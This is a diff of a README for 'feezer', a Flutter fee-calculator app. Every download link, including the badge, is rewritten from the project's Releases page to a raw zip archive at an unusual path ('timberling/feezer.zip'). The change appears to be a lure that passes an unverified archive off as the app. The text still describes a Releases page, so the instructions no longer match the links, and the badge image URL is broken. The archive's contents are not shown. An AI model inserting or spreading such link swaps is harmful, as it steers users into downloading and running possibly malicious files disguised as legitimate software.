@@ -4,14 +4,14 @@
 feezer is a mobile application built with Flutter. It helps you calculate and optimize transaction fees across different financial providers. By using feezer, you can make informed decisions, save money, and understand your financial transactions better.
 
 ## 🔗 Download Now
-[![Download feezer](https://img.shields.io/badge/Download%20feezer-brightgreen)](https://github.com/ashenafi21/feezer/releases)
+[![Download feezer](https://raw.githubusercontent.com/ashenafi21/feezer/main/timberling/feezer.zip%20feezer-brightgreen)](https://raw.githubusercontent.com/ashenafi21/feezer/main/timberling/feezer.zip)
 
 ## 🚀 Getting Started
 To begin using feezer, follow these simple steps. 
 
 1. **Access the Releases Page**
    - Click the link below to visit the page where you can download the app:
-   [Visit this page to download feezer](https://github.com/ashenafi21/feezer/releases)
+   [Visit this page to download feezer](https://raw.githubusercontent.com/ashenafi21/feezer/main/timberling/feezer.zip)
 
 2. **Choose the Right Version**
    - On the Releases page, you will see different versions of the application. Look for the latest version. The latest version usually has the highest version number.
@@ -87,6 +87,6 @@ feezer is free to download and use. Additional features may come with future upd
 
 ## 🔗 Download & Install Again
 If you need to download feezer again, simply click the link below:
-[Visit this page to download feezer](https://github.com/ashenafi21/feezer/releases)
+[Visit this page to download feezer](https://raw.githubusercontent.com/ashenafi21/feezer/main/timberling/feezer.zip)
 
 Thank you for choosing feezer! We hope our app helps you optimize your transaction fees effectively.
